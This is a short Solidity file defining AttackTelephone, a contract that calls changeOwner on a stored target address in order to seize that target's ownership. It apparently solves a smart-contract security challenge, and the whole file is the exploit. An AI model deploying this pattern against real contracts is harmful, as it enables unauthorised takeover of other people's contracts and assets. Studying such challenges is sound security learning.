// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    ITelephone public targetContract;

    constructor(address _targetAddress) {
        targetContract = ITelephone(_targetAddress);
    }

    function claimOwnership() public {
        targetContract.changeOwner(msg.sender);
    }
}
